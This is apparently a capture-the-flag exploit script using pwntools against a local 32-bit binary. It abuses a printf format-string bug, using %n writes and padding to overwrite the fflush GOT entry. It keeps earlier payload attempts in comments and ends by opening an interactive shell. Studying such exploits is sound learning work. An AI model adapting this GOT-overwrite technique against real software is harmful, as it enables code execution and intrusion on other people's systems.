#Import pwntools
from pwn import *

#Establish the target process, or network connection
target = process('./32_new')

#Attach gdb if it is a process
#exactly after the 'printf'
gdb.attach(target, gdbscript='b *0x080487dc')

#Print the first line of text
print target.recvline()

#Establish the addresses which we will be writing to
fflush_adr0 = p32(0x804a028) #first byte --> 0x804a028
fflush_adr1 = p32(0x804a029) #second and third byte --> 0x804a029, 0x804a02a
fflush_adr2 = p32(0x804a02b) #fourth byte --> 0x804a02b

#Establish the necessary inputs for our input, so we can write to the addresses
fmt_string0 = "%10$n"
fmt_string1 = "%11$n"
fmt_string2 = "%12$n"

#Form the payload
# payload 1
# payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fmt_string0 + fmt_string1 + fmt_string2

# payload 2
# 0x10b - 0x52 = 185
# payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + "%185x" + fmt_string0 + fmt_string1 + fmt_string2

# payload 3
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + "%185x" + fmt_string0 + "%892x" + fmt_string1 + fmt_string2


#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
